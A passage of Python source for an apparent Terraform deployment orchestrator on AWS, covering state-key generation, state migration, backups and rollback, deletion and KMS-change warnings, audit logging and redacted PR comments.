                    detected_services.add(service)
                    debug_print(f"✅ Detected service: {service} (from {tfvars_key} pattern: {pattern})")
            
            services_list = list(detected_services)
            debug_print(f"📊 Total unique services detected: {len(services_list)} → {services_list}")
            
            if not services_list:
                debug_print(f"⚠️  WARNING: No services detected in {tfvars_file.name}")
                debug_print(f"📋 Available service mappings: {list(self.service_mapping.keys())}")
            
            return services_list
            
        except Exception as e:
            debug_print(f"Error detecting services from {tfvars_file}: {e}")
            return []
    
    def _read_tfvars_cached(self, tfvars_file: Path) -> str:
        """Read tfvars file with caching to eliminate redundant disk I/O.
        
        Performance improvement: Eliminates 5+ redundant reads per deployment.
        
        CRITICAL: Always use absolute path for cache key to avoid path resolution issues.
        """
        # CRITICAL FIX: Use absolute path for cache key to ensure consistency
        file_key = str(tfvars_file.resolve())
        
        if file_key not in self.tfvars_cache:
            # Read actual file content
            with open(tfvars_file, 'r') as f:
                self.tfvars_cache[file_key] = f.read()
            debug_print(f"📖 Cached tfvars content: {tfvars_file.name} ({len(self.tfvars_cache[file_key])} bytes)")
        else:
            debug_print(f"⚡ Using cached tfvars: {tfvars_file.name} ({len(self.tfvars_cache[file_key])} bytes)")
        
        return self.tfvars_cache[file_key]
    
    def _extract_resource_names_from_tfvars(self, tfvars_file: Path, services: List[str]) -> List[str]:
        """Extract resource names from tfvars for state file naming - uses cache"""
        try:
            content = self._read_tfvars_cached(tfvars_file)
            
            resource_names = []
            
            # Service-specific patterns to extract resource names
            if 's3' in services:
                # Extract S3 bucket names
                # Pattern: bucket = "bucket-name" or "bucket-key" = {
                s3_patterns = [
                    r'"([a-z0-9][a-z0-9-]*[a-z0-9])"\s*=\s*\{',  # "bucket-name" = {
                    r'bucket\s*=\s*"([^"]+)"',  # bucket = "name"
                ]
                for pattern in s3_patterns:
                    matches = re.findall(pattern, content)
                    resource_names.extend(matches)
            
            if 'kms' in services:
                # Extract KMS key aliases or descriptions
                kms_patterns = [
                    r'"([a-z0-9][a-z0-9-]*[a-z0-9])"\s*=\s*\{',  # "key-name" = {
                    r'aliases\s*=\s*\["([^"]+)"',  # aliases = ["alias"]
                    r'description\s*=\s*"([^"]+)"',  # description = "name"
                ]
                for pattern in kms_patterns:
                    matches = re.findall(pattern, content)
                    resource_names.extend([m.replace('alias/', '').replace(' ', '-').lower() for m in matches])
            
            if 'iam' in services:
                # Extract IAM role/policy names
                iam_patterns = [
                    r'"([A-Za-z0-9][A-Za-z0-9-_]*[A-Za-z0-9])"\s*=\s*\{',  # "role-name" = {
                    r'role_name\s*=\s*"([^"]+)"',  # role_name = "name"
                    r'policy_name\s*=\s*"([^"]+)"',  # policy_name = "name"
                ]
                for pattern in iam_patterns:
                    matches = re.findall(pattern, content)
                    resource_names.extend(matches)
            
            if 'lambda' in services:
                # Extract Lambda function names
                lambda_patterns = [
                    r'function_name\s*=\s*"([^"]+)"',  # function_name = "name"
                    r'"([a-z0-9][a-z0-9-]*[a-z0-9])"\s*=\s*\{',  # "function-name" = {
                ]
                for pattern in lambda_patterns:
                    matches = re.findall(pattern, content)
                    resource_names.extend(matches)
            
            # Remove duplicates and clean up names
            unique_names = []
            seen = set()
            for name in resource_names:
                clean_name = name.strip().replace(' ', '-').lower()
                # Skip account IDs (all digits), common metadata keys, and invalid names
                if (clean_name and 
                    clean_name not in seen and 
                    len(clean_name) < 50 and
                    not clean_name.isdigit() and  # Skip account IDs like "802860742843"
                    clean_name not in ['accounts', 'account', 'common_tags', 'tags']):
                    unique_names.append(clean_name)
                    seen.add(clean_name)
            
            debug_print(f"Extracted resource names: {unique_names}")
            return unique_names[:5]  # Limit to first 5 resources
            
        except Exception as e:
            debug_print(f"Error extracting resource names from {tfvars_file}: {e}")
            return []

    def _generate_dynamic_backend_key(self, deployment: Dict, services: List[str], tfvars_file: Path = None) -> str:
        """Generate dynamic backend key with ultra-granular resource-level isolation.
        
        Format: {service}/{account}/{region}/{project}/{resource_name}/terraform.tfstate
        
        Examples:
        - s3/arj-wkld-a-prd/us-east-1/test-poc-3/arj-test-bucket/terraform.tfstate
        - iam/arj-wkld-a-prd/us-east-1/test-poc-3/arj-admin-role/terraform.tfstate
        - multi/arj-wkld-a-prd/us-east-1/test-poc-3/combined/terraform.tfstate (fallback)
        
        Each resource gets its own state file for maximum isolation.
        """
        # SECURITY: Sanitize inputs to prevent path traversal and command injection
        account_name = sanitize_s3_key(deployment.get('account_name', 'unknown'))
        project = sanitize_s3_key(deployment.get('project', 'unknown'))
        region = sanitize_s3_key(deployment.get('region', 'us-east-1'))
        
        # Extract resource names from tfvars
        resource_names = []
        if tfvars_file:
            raw_names = self._extract_resource_names_from_tfvars(tfvars_file, services)
            # SECURITY: Sanitize all resource names to prevent command injection
            resource_names = [sanitize_s3_key(name) for name in raw_names]
        
        # Determine service and resource name/path based on count
        if len(services) == 0:
            # No services detected - likely detection failure, use project name as fallback
            service_part = "general"
            resource_path = project
            debug_print(f"⚠️  WARNING: No services detected! Using general/{project}")
        elif len(services) == 1:
            # SECURITY: Sanitize service name
            service_part = sanitize_s3_key(services[0])
            # Handle single vs multiple resources
            if len(resource_names) == 0:
                # No resource names extracted - use project name
                resource_path = project
            elif len(resource_names) == 1:
                # Single resource - create subfolder with resource name
                # Example: s3/.../project/bucket-name/terraform.tfstate
                resource_path = resource_names[0]
            else:
                # Multiple resources - use project name to group them
                # Example: s3/.../project/terraform.tfstate
                resource_path = project
        else:
            # Multiple services - use "multi" prefix with sorted service names
            # Examples:
            # - S3 + IAM: multi/.../project/iam-s3/terraform.tfstate
            # - S3 + Lambda + IAM: multi/.../project/iam-lambda-s3/terraform.tfstate
            service_part = BACKEND_KEY_MULTI_SERVICE_PREFIX
            # SECURITY: Sanitize each service name before joining
            sanitized_services = [sanitize_s3_key(s) for s in sorted(services)]
            resource_path = "-".join(sanitized_services)
            debug_print(f"✅ Multi-service deployment detected: {resource_path}")
        
        # Generate backend key - always use resource_path (never empty)
        backend_key = f"{service_part}/{account_name}/{region}/{project}/{resource_path}/terraform.tfstate"
        
        debug_print(f"Generated backend key: {backend_key}")
        debug_print(f"  Services: {services} -> service_part: {service_part}")
        debug_print(f"  Resource names extracted: {resource_names}")
        debug_print(f"  Project: {project}, Resource path: {resource_path}")
        debug_print(f"  Account: {account_name}, Region: {region}")
        
        return backend_key

    def _auto_migrate_state_if_needed(self, new_backend_key: str, services: List[str], deployment: Dict):
        """Automatically migrate state from old backend key to new if backend changed.
        
        Detects scenarios like:
        - Single service → Multi-service: s3/.../project/ → multi/.../project/iam-s3/
        - Resource count change: s3/.../project/bucket1/ → s3/.../project/
        """
        # SECURITY: Sanitize all inputs before using in AWS CLI commands
        backend_bucket = TERRAFORM_STATE_BUCKET
        new_backend_key = sanitize_s3_key(new_backend_key)
        account = sanitize_s3_key(deployment.get('account_name'))
        account_id = sanitize_aws_account_id(deployment.get('account_id'))  # Get account ID for role assumption
        region = sanitize_s3_key(deployment.get('region', AWS_DEFAULT_REGION))
        project = sanitize_s3_key(deployment.get('project'))
        
        # Generate potential old backend keys to check
        old_keys = []
        
        if len(services) > 1:
            # Multi-service now - check if single service states exist
            for service in services:
                # SECURITY: Sanitize service name
                safe_service = sanitize_s3_key(service)
                # List all possible old state locations for this service
                # Could be: service/.../project/terraform.tfstate OR service/.../project/*/terraform.tfstate
                list_cmd = ["aws", "s3", "ls", f"s3://{backend_bucket}/{safe_service}/{account}/{region}/{project}/", "--recursive"]
                try:
                    list_result = run_aws_command_with_assume_role(list_cmd, account_id)
                    if list_result.returncode == 0:
                        # Find terraform.tfstate files
                        for line in list_result.stdout.splitlines():
                            if 'terraform.tfstate' in line and not line.strip().endswith('/'):
                                # Extract the key from the line (format: "date time size key")
                                parts = line.split()
                                if len(parts) >= 4:
                                    key = ' '.join(parts[3:])  # Handle keys with spaces
                                    old_keys.append(key)
                                    debug_print(f"Found potential old state: {key}")
                except Exception as e:
                    debug_print(f"Error listing old states for {service}: {e}")
        
        # Check if any old state exists
        for old_key in old_keys:
            try:
                check_cmd = ["aws", "s3", "ls", f"s3://{backend_bucket}/{old_key}"]
                result = run_aws_command_with_assume_role(check_cmd, account_id)
                
                if result.returncode == 0:
                    print(f"🔍 Found existing state at old location: {old_key}")
                    print(f"🔄 Migrating to new backend key: {new_backend_key}")
                    
                    # Backup old state
                    success, backup_key = backup_terraform_state(backend_bucket, old_key, account_id, "auto-migration")
                    if not success:
                        print(f"⚠️  Failed to backup state - skipping migration")
                        return
                    
                    # Copy old state to new location
                    copy_cmd = [
                        "aws", "s3", "cp",
                        f"s3://{backend_bucket}/{old_key}",
                        f"s3://{backend_bucket}/{new_backend_key}"
                    ]
                    
                    copy_result = run_aws_command_with_assume_role(copy_cmd, account_id)
                    if copy_result.returncode == 0:
                        print(f"✅ State migrated successfully!")
                        print(f"   Old: {old_key}")
                        print(f"   New: {new_backend_key}")
                        print(f"   Backup: {backup_key}")
                        
                        # OLD STATE CLEANUP - MANUAL ONLY FOR SAFETY
                        print(f"\n🛡️  Old state location preserved for safety")
                        print(f"   Old state: s3://{backend_bucket}/{old_key}")
                        print(f"   Backup: s3://{backend_bucket}/{backup_key}")
                        print(f"\n💡 To manually clean up old state after verifying migration:")
                        print(f"   aws s3 rm s3://{backend_bucket}/{old_key}")
                        print(f"\n⚠️  IMPORTANT: Verify new state is working before deleting old state!\n")
                        
                        return
                    else:
                        print(f"❌ Failed to copy state: {copy_result.stderr}")
                        return
                        
            except Exception as e:
                debug_print(f"Error checking old state {old_key}: {e}")
                continue

    def _extract_terraform_outputs(self, terraform_output: str, action: str) -> Dict:
        """Extract resource outputs from terraform output for PR comments"""
        outputs = {
            'resources_created': [],
            'resources_modified': [],
            'resources_destroyed': [],
            'resource_details': {}
        }
        
        try:
            lines = terraform_output.split('\n')
            current_section = None
            
            for line in lines:
                line = line.strip()
                
                # Detect terraform plan sections
                if 'will be created' in line:
                    current_section = 'created'
                    resource_name = self._extract_resource_name(line)
                    if resource_name:
                        outputs['resources_created'].append(resource_name)
                elif 'will be updated' in line or 'will be modified' in line:
                    current_section = 'modified'
                    resource_name = self._extract_resource_name(line)
                    if resource_name:
                        outputs['resources_modified'].append(resource_name)
                elif 'will be destroyed' in line or 'must be replaced' in line:
                    current_section = 'destroyed'
                    resource_name = self._extract_resource_name(line)
                    if resource_name:
                        # Add destruction reason if it's a replacement
                        if 'must be replaced' in line:
                            outputs['resources_destroyed'].append(f"{resource_name} (replacement)")
                        else:
                            outputs['resources_destroyed'].append(resource_name)
                
                # Extract specific resource details (ARNs, names, etc.)
                if action == 'apply':
                    self._extract_resource_details(line, outputs['resource_details'])
            
            debug_print(f"Extracted outputs: {outputs}")
            return outputs
            
        except Exception as e:
            debug_print(f"Error extracting terraform outputs: {e}")
            return outputs

    def _extract_resource_name(self, line: str) -> Optional[str]:
        """Extract resource name from terraform output line"""
        # Pattern 1: # aws_s3_bucket.example will be created
        match = re.search(r'#\s+(\S+)\s+will be', line)
        if match:
            return match.group(1)
        
        # Pattern 2: # aws_s3_bucket.example must be replaced
        match = re.search(r'#\s+(\S+)\s+must be', line)
        if match:
            return match.group(1)
        
        # Pattern 3: aws_s3_bucket.example (resource in plan)
        match = re.search(r'(aws_[a-z0-9_]+\.[a-z0-9_\-\[\]"]+)', line)
        if match:
            return match.group(1)
        
        return None
    
    def _extract_resource_details(self, line: str, resource_details: Dict):
        """Extract specific resource details (ARNs, IDs, names) from terraform apply output.
        
        This is a GENERIC extractor that works with ANY AWS resource type.
        Uses universal patterns instead of service-specific logic.
        
        Args:
            line: Single line from terraform output
            resource_details: Dictionary to populate with extracted details
        """
        try:
            # Universal pattern: Extract any ARN
            arn_match = re.search(r'(arn:aws:[a-z0-9\-]+:[a-z0-9\-]*:\d{12}:[^\s"]+)', line)
            if arn_match:
                arn = arn_match.group(1)
                resource_type = arn.split(':')[2]  # Extract service from ARN
                if 'arns' not in resource_details:
                    resource_details['arns'] = []
                resource_details['arns'].append({'type': resource_type, 'arn': arn})
            
            # Universal pattern: Extract resource IDs (i-xxx, sg-xxx, vol-xxx, etc.)
            id_match = re.search(r'\b((?:i|sg|vol|subnet|vpc|igw|rtb|eni|ami|snap|nat|eipalloc|vpce)-[a-z0-9]+)\b', line)
            if id_match:
                resource_id = id_match.group(1)
                if 'resource_ids' not in resource_details:
                    resource_details['resource_ids'] = []
                resource_details['resource_ids'].append(resource_id)
            
            # Universal pattern: Extract attribute = value pairs from apply output
            attr_match = re.search(r'(\w+)\s*=\s*"([^"]+)"', line)
            if attr_match:
                attr_name = attr_match.group(1)
                attr_value = attr_match.group(2)
                # Store commonly useful attributes
                if attr_name in ['id', 'arn', 'name', 'endpoint', 'dns_name', 'url']:
                    if 'attributes' not in resource_details:
                        resource_details['attributes'] = {}
                    resource_details['attributes'][attr_name] = attr_value
                    
        except Exception as e:
            debug_print(f"Error extracting resource details from line: {e}")
    
    def _detect_resource_deletions(self, plan_output: str, environment: str) -> Tuple[List[str], List[str]]:
        """Detect resource deletions and block production deletions"""
        warnings = []
        errors = []
        
        # Parse deletion indicators
        deletion_lines = []
        for line in plan_output.split('\n'):
            if any(pattern in line for pattern in ['will be destroyed', 'must be replaced', '-/+', 'forces replacement']):
                deletion_lines.append(line.strip())
        
        if deletion_lines:
            count = len(deletion_lines)
            
            if environment.lower() in ['production', 'prod', 'prd']:
                errors.append(
                    f"🛑 PRODUCTION DELETION BLOCKED: {count} resource(s) will be destroyed/replaced! "
                    f"Manual review and explicit approval required. Resources: {', '.join(deletion_lines[:5])}"
                )
            else:
                warnings.append(
                    f"⚠️  Resource Deletion: {count} resource(s) will be destroyed/replaced. "
                    f"Review carefully: {', '.join(deletion_lines[:3])}"
                )
        
        # CRITICAL: Detect KMS key changes on S3 buckets - HIGH ALERT
        kms_changes = []
        in_encryption_block = False
        current_resource = None
        
        for line in plan_output.split('\n'):
            # Detect encryption configuration resource
            if 'aws_s3_bucket_server_side_encryption_configuration' in line:
                in_encryption_block = True
                current_resource = line.strip()
            
            # Detect KMS key ID changes
            if in_encryption_block and 'kms_master_key_id' in line:
                if '~' in line or '->' in line or 'will be updated' in line.lower():
                    kms_changes.append(line.strip())
                    
                    # Add HIGH ALERT warning (not blocking - let it proceed with warning)
                    warnings.append(
                        f"🚨 HIGH ALERT: KMS KEY CHANGE DETECTED on S3 bucket!\n"
                        f"   Resource: {current_resource}\n"
                        f"   Change: {line.strip()}\n"
                        f"   ⚠️  CRITICAL: Existing objects encrypted with old key will become UNREADABLE if old key is deleted\n"
                        f"   📋 Action Required BEFORE deleting old key:\n"
                        f"      1. Re-encrypt all S3 objects with new key\n"
                        f"      2. Command: aws s3 cp s3://bucket-name/ s3://bucket-name/ --recursive --sse aws:kms --sse-kms-key-id NEW-KEY --metadata-directive REPLACE\n"
                        f"      3. Verify all objects re-encrypted\n"
                        f"      4. Keep old KMS key active for 30+ days minimum\n"
                        f"   💡 Or: Keep both KMS keys active indefinitely"
                    )
            
            # Exit encryption block
            if in_encryption_block and (line.strip() == '}' or 'resource "' in line):
                in_encryption_block = False
        
        return warnings, errors
    
    def _cleanup_old_workspaces(self, max_age_hours: int = 24):
        """Clean up old deployment workspaces - WARNING ONLY, NO AUTO-DELETE"""
        try:
            main_dir = self.project_root
            current_time = time.time()
            old_workspaces = []
            
            for workspace_dir in main_dir.glob('.terraform-workspace-*'):
                if workspace_dir.is_dir():
                    dir_age_hours = (current_time - workspace_dir.stat().st_mtime) / 3600
                    
                    if dir_age_hours > max_age_hours:
                        old_workspaces.append((workspace_dir, dir_age_hours))
            
            if old_workspaces:
                print(f"\n⚠️  Found {len(old_workspaces)} old workspace(s) older than {max_age_hours}h:")
                for workspace_dir, age in old_workspaces[:5]:  # Show first 5
                    print(f"   - {workspace_dir.name} (age: {age:.1f}h)")
                if len(old_workspaces) > 5:
                    print(f"   ... and {len(old_workspaces) - 5} more")
                print(f"\n💡 To clean up old workspaces, run manually:")
                print(f"   rm -rf {main_dir}/.terraform-workspace-*")
                print(f"\n🛡️  SAFETY: Workspaces are NOT auto-deleted to prevent accidental data loss\n")
            else:
                debug_print(f"No old workspaces found (checked for age > {max_age_hours}h)")
        except Exception as e:
            debug_print(f"Workspace cleanup check failed: {e}")
    
    def _backup_state_file(self, backend_key: str, deployment_name: str) -> Tuple[bool, str]:
        """Backup current state file to S3 with timestamp before apply"""
        try:
            import boto3
            from datetime import datetime
            
            # SECURITY: Sanitize S3 key before boto3 operations
            backend_key = sanitize_s3_key(backend_key)
            
            s3 = boto3.client('s3')
            bucket = TERRAFORM_STATE_BUCKET
            
            # Check if state file exists
            try:
                s3.head_object(Bucket=bucket, Key=backend_key)
            except:
                print(f"ℹ️  No existing state file to backup for {deployment_name}")
                return True, "no-previous-state"
            
            # Create backup with timestamp
            timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
            backup_key = sanitize_s3_key(f"backups/{backend_key}.{timestamp}.backup")
            
            # Copy current state to backup location
            s3.copy_object(
                Bucket=bucket,
                CopySource={'Bucket': bucket, 'Key': backend_key},
                Key=backup_key,
                ServerSideEncryption='AES256'  # Encrypt backup
            )
            
            # Store backup info for potential rollback
            self.state_backups[deployment_name] = {
                'backup_key': backup_key,
                'original_key': backend_key,
                'timestamp': timestamp
            }
            
            print(f"💾 State backed up: s3://{bucket}/{backup_key}")
            return True, backup_key
            
        except Exception as e:
            print(f"⚠️  State backup failed: {e}")
            return False, str(e)
    
    def _verify_state_file_integrity(self, deployment_workspace: Path) -> bool:
        """Check if state file is valid and not corrupted"""
        try:
            # Try to list resources from state
            result = self._run_terraform_command(['state', 'list'], deployment_workspace)
            
            if result['returncode'] == 0:
                # State file is readable and valid
                return True
            else:
                # State file corrupted or missing
                print(f"⚠️  State file integrity check failed: {result.get('stderr', 'unknown error')}")
                return False
                
        except Exception as e:
            print(f"⚠️  State file integrity check error: {e}")
            return False
    
    def _rollback_state_file(self, deployment_name: str) -> bool:
        """Rollback to previous state file if apply fails"""
        try:
            import boto3
            
            if deployment_name not in self.state_backups:
                print(f"⚠️  No backup found for {deployment_name}")
                return False
            
            backup_info = self.state_backups[deployment_name]
            
            # SECURITY: Sanitize S3 keys before boto3 operations
            safe_backup_key = sanitize_s3_key(backup_info['backup_key'])
            safe_original_key = sanitize_s3_key(backup_info['original_key'])
            
            s3 = boto3.client('s3')
            bucket = TERRAFORM_STATE_BUCKET
            
            print(f"🔄 Rolling back state from backup: {safe_backup_key}")
            
            # Copy backup back to original location
            s3.copy_object(
                Bucket=bucket,
                CopySource={'Bucket': bucket, 'Key': safe_backup_key},
                Key=safe_original_key
            )
            
            print(f"✅ State rolled back successfully")
            return True
            
        except Exception as e:
            print(f"❌ Rollback failed: {e}")
            return False
    
    def _save_audit_log(self, deployment: Dict, result: Dict, action: str):
        """Save detailed audit log to S3 with full unredacted output"""
        try:
            import boto3
            from datetime import datetime
            
            if not AUDIT_LOG_ENABLED:
                return True
            
            s3 = boto3.client('s3')
            bucket = AUDIT_LOG_BUCKET
            
            timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
            # SECURITY: Sanitize all path components
            safe_account = sanitize_s3_key(deployment['account_name'])
            safe_project = sanitize_s3_key(deployment['project'])
            safe_action = sanitize_s3_key(action)
            log_key = f"{AUDIT_LOG_PREFIX}/{safe_account}/{safe_project}/{safe_action}-{timestamp}.json"
            
            audit_data = {
                'timestamp': datetime.now().isoformat(),
                'action': action,
                'deployment': deployment,
                'result': {
                    'success': result['success'],
                    'backend_key': result.get('backend_key', 'unknown'),
                    'services': result.get('services', []),
                    'output': result.get('output', ''),  # Full unredacted output
                    'error': result.get('error'),
                    'error_detail': result.get('error_detail')
                },
                'orchestrator_version': ORCHESTRATOR_VERSION
            }
            
            # Save to S3 with encryption
            s3.put_object(
                Bucket=bucket,
                Key=log_key,
                Body=json.dumps(audit_data, indent=2),
                ServerSideEncryption='AES256',
                ContentType='application/json'
            )
            
            print(f"📝 Audit log saved: s3://{bucket}/{log_key}")
            return True
            
        except Exception as e:
            print(f"⚠️  Audit log save failed: {e}")
            return False

    def _validate_terraform_fmt(self, workspace: Path) -> Tuple[List[str], List[str]]:
        """Validate terraform formatting standards"""
        warnings = []
        errors = []
        
        try:
            result = subprocess.run(
                ['terraform', 'fmt', '-check', '-recursive'],
                cwd=workspace,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode != 0:
                unformatted_files = result.stdout.strip().split('\n') if result.stdout else []
                if unformatted_files:
                    warnings.append(
                        f"⚠️  Code formatting: {len(unformatted_files)} file(s) need formatting. "
                        f"Run 'terraform fmt -recursive' to fix."
                    )
        except Exception as e:
            warnings.append(f"⚠️  Terraform fmt check failed: {str(e)}")
        
        return warnings, errors
    
    def _validate_tfvars_file(self, tfvars_file: Path) -> Tuple[bool, str]:
        """Validate tfvars file exists and has valid syntax"""
        try:
            if not tfvars_file.exists():
                return False, f"Tfvars file not found: {tfvars_file}"
            
            if tfvars_file.stat().st_size == 0:
                return False, f"Tfvars file is empty: {tfvars_file}"
            
            # Use cached tfvars content for performance
            content = self._read_tfvars_cached(tfvars_file)
            
            # Basic HCL syntax validation
            if content.count('{') != content.count('}'):
                return False, "Mismatched braces in tfvars file"
            if content.count('[') != content.count(']'):
                return False, "Mismatched brackets in tfvars file"
            
            debug_print(f"Tfvars validation passed: {tfvars_file}")
            return True, "Valid"
            
        except Exception as e:
            return False, f"Validation error: {e}"
    
    def _comprehensive_validation(self, tfvars_file: Path, deployment: Dict) -> Tuple[List[str], List[str]]:
        """
        COMPREHENSIVE PRE-DEPLOYMENT VALIDATION
        Validates: ARNs, policies, resource names, AWS standards
        Returns: (warnings, errors) - errors BLOCK deployment
        """
        warnings = []
        errors = []
        
        try:
            # Use cached tfvars content for performance
            content = self._read_tfvars_cached(tfvars_file)
            
            account_id = deployment.get('account_id')
            environment = deployment.get('environment', 'unknown')
            
            print(f"🔍 Running comprehensive validation...")
            
            # 0. VALIDATE TERRAFORM FORMATTING
            fmt_warnings, fmt_errors = self._validate_terraform_fmt(self.working_dir)
            warnings.extend(fmt_warnings)
            errors.extend(fmt_errors)
            
            # 1. VALIDATE ARNS MATCH ACCOUNT
            arn_pattern = r'arn:aws:[a-z0-9\-]+:[a-z0-9\-]*:(\d{12}):'
            arns_found = re.findall(arn_pattern, content)
            for arn_account in set(arns_found):
                if arn_account != account_id:
                    warnings.append(
                        f"⚠️  Cross-account ARN detected: account {arn_account} (deploying to {account_id}). "
                        f"Verify cross-account access is configured correctly."
                    )
            
            # 2. VALIDATE POLICY JSON FILES
            policy_pattern = r'["\']([^"\']+\.json)["\']'
            policy_files = re.findall(policy_pattern, content)
            
            if policy_files:
                print(f"   Found {len(policy_files)} policy file(s) to validate")
                
                for policy_path in policy_files:
                    policy_file = Path(policy_path)
                    
                    # Validate JSON syntax and AWS standards
                    is_valid, pol_warnings, pol_errors = validate_policy_json_file(
                        policy_file,
                        self.working_dir,
                        account_id
                    )
                    
                    warnings.extend(pol_warnings)
                    errors.extend(pol_errors)
                    
                    # Validate resource names match - CRITICAL CHECK
                    if is_valid:
                        name_warnings, name_errors = validate_resource_names_match(
                            policy_file,
                            content,
                            self.working_dir
                        )
                        warnings.extend(name_warnings)
                        errors.extend(name_errors)  # Resource mismatches are BLOCKERS
                    
                    status = "✅" if is_valid else "❌"
                    print(f"   {status} {policy_file.name}: {len(pol_errors)} errors, {len(pol_warnings)} warnings")
            
            # 3. PRODUCTION ENVIRONMENT CHECKS (Generic - any service)
            if environment.lower() in ['production', 'prod', 'prd']:
                # Generic destroy protection check
                if 'prevent_destroy = false' in content or 'prevent_destroy=false' in content:
                    warnings.append(
                        f"⚠️  PRODUCTION: prevent_destroy=false allows resource deletion!"
                    )
            
            print(f"   Validation complete: {len(warnings)} warnings, {len(errors)} errors")
            
        except Exception as e:
            errors.append(f"🚫 Validation exception: {str(e)}")
        
        return warnings, errors

    def _generate_enhanced_pr_comment(self, deployment: Dict, result: Dict, services: List[str]) -> str:
        """Generate enhanced PR comment with service details and outputs - REDACTED for security"""
        deployment_name = f"{deployment['account_name']}-{deployment['project']}"
        orchestrator_ver = result.get('orchestrator_version', ORCHESTRATOR_VERSION)
        
        # SECURITY: Redact sensitive data from all outputs
        redacted_output = redact_sensitive_data(result.get('output', ''))
        redacted_error = redact_sensitive_data(result.get('error', 'Unknown error'))
        
        if not result['success']:
            # Error comment - REDACTED
            return f"""### ❌ {deployment_name} - Deployment Failed

**Services:** {', '.join(services) if services else 'None detected'}

**Error:** {redacted_error}

<details><summary><strong>🚨 Error Details (Sensitive data redacted)</strong></summary>

```
{redacted_output[:2000]}
```

</details>

🔒 **Security Notice:** Sensitive data (ARNs, Account IDs, IPs) redacted from PR comments.
📋 **Full logs:** Saved to encrypted audit log in S3 for compliance.

Please fix the errors and push to a new branch.

---
"""
        
        # Success comment - REDACTED
        outputs = self._extract_terraform_outputs(redacted_output, result.get('action', 'unknown'))
        
        # Get validation results
        val_warnings = result.get('validation_warnings', [])
        val_errors = result.get('validation_errors', [])
        
        comment = f"""### ✅ {deployment_name} - Deployment Successful

**Services:** {', '.join(services) if services else 'None detected'}
**Action:** {result.get('action', 'unknown').title()}
**Orchestrator Version:** v{orchestrator_ver}

"""
        
        # CHECK FOR RESOURCE DESTRUCTION - HIGH PRIORITY ALERT
        # Note: OPA policies enforce resource protection rules
        if outputs.get('resources_destroyed'):
            destroyed_resources = outputs['resources_destroyed']
            
            comment += """
---

## 🚨 HIGH ALERT: RESOURCE DESTRUCTION DETECTED

"""
            
            comment += f"""
### ⚠️  {len(destroyed_resources)} RESOURCE(S) WILL BE DESTROYED/REPLACED

**Resources to be destroyed:**

"""
            
            # List all resources (limit to 20 for readability)
            for resource in destroyed_resources[:20]:
                comment += f"- ⚠️  `{resource}`\n"
            
            if len(destroyed_resources) > 20:
                comment += f"\n... and {len(destroyed_resources) - 20} more resources\n\n"
            
            comment += f"""

### 🛡️  OPA Policy Validation

✅ **OPA policies have been validated** - Resource protection rules enforced

### 🛑 ACTION REQUIRED BEFORE PROCEEDING:

1. **Verify this is intentional** - Confirm you want to destroy these resources
2. **Check OPA policy results** - Ensure no policy violations detected
3. **Backup data if needed** - For S3: download objects, For databases: create snapshots
4. **Check dependencies** - Ensure no applications are using these resources
5. **Get approval** - Production deletions require team lead sign-off
6. **Document reason** - Add comment explaining why these resources are being destroyed

### 📊 Destruction Summary:

| Total Resources to Destroy | {len(destroyed_resources)} |
|----------------------------|----|
| **OPA Policy Status** | ✅ Validated |

### 🎯 Deployment Decision:

- ⚠️  **Review list above** - Confirm all expected resources
- 🛡️  **OPA policies enforced** - Resource protection validated
- 📋 **Production deletions** - Require explicit approval
- 💾 **Backup completed?** - Verify before proceeding

---

"""
        
        # CHECK FOR HIGH ALERT KMS KEY CHANGES
        kms_key_change_warnings = [w for w in val_warnings if '🚨 HIGH ALERT: KMS KEY CHANGE' in w]
        if kms_key_change_warnings:
            comment += """
---

## 🚨 HIGH ALERT: KMS ENCRYPTION KEY CHANGE DETECTED

"""
            for kms_warning in kms_key_change_warnings:
                comment += f"```\n{kms_warning}\n```\n\n"
            
            comment += """
### ⚠️ CRITICAL RISK - READ BEFORE PROCEEDING

**What This Means:**
- S3 bucket encryption key is being changed
- **Existing objects** will remain encrypted with the **OLD key**
- **New objects** will be encrypted with the **NEW key**
- If you delete the OLD KMS key → **existing objects become UNREADABLE** → **DATA LOSS**

### ✅ Safe Migration Steps (REQUIRED):

1. **Re-encrypt all existing objects FIRST:**
   ```bash
   # Get bucket name from plan above
   aws s3 cp s3://BUCKET-NAME/ s3://BUCKET-NAME/ \\
     --recursive \\
     --sse aws:kms \\
     --sse-kms-key-id NEW-KEY-ARN \\
     --metadata-directive REPLACE
   ```

2. **Verify all objects re-encrypted:**
   ```bash
   # Check object encryption
   aws s3api head-object --bucket BUCKET-NAME --key OBJECT-KEY
   ```

3. **Wait 30+ days minimum** before considering deletion of old KMS key

4. **OR: Keep both keys active indefinitely** (safest option)

### 📋 Deployment Decision:

- ✅ **Safe to proceed** if you plan to keep BOTH keys active
- ⚠️ **Proceed with caution** if you need to migrate keys - follow steps above
- 🛑 **Stop if unsure** - consult with security/platform team

---

"""
        
        # ADD COMPREHENSIVE VALIDATION RESULTS
        if val_errors or val_warnings:
            comment += "---\n\n## 🔍 Pre-Deployment Validation Report\n\n"
            
            # Overall status
            if val_errors:
                comment += "### 🚫 VALIDATION FAILED\n\n"
                comment += "❌ **Deployment has been BLOCKED** due to critical validation errors that must be fixed.\n\n"
            else:
                comment += "### ✅ VALIDATION PASSED WITH WARNINGS\n\n"
                comment += "⚠️  **Deployment will proceed** but please review warnings below.\n\n"
            
            # Validation checklist
            comment += "#### 🛡️ Validation Checklist:\n\n"
            comment += "| Check | Status | Details |\n"
            comment += "|-------|--------|---------|\n"
            
            # Determine what passed/failed based on errors/warnings content
            format_status = "✅ Passed"
            arn_status = "✅ Passed"
            policy_status = "✅ Passed"
            resource_status = "✅ Passed"
            deletion_status = "✅ Safe"
            
            for error in val_errors:
                if "terraform fmt" in error.lower() or "formatting" in error.lower():
                    format_status = "❌ Failed"
                if "arn" in error.lower() and "account" in error.lower():
                    arn_status = "❌ Failed"
                if "policy" in error.lower() and ("json" in error.lower() or "syntax" in error.lower()):
                    policy_status = "❌ Failed"
                if "resource name" in error.lower() or "bucket name" in error.lower():
                    resource_status = "❌ Failed"
                if "deletion" in error.lower() or "destroy" in error.lower():
                    deletion_status = "🛑 BLOCKED"
            
            for warning in val_warnings:
                if "terraform fmt" in warning.lower() or "formatting" in warning.lower():
                    format_status = "⚠️  Needs Fix"
                if "deletion" in warning.lower() or "destroy" in warning.lower():
                    deletion_status = "⚠️  Review Required"
            
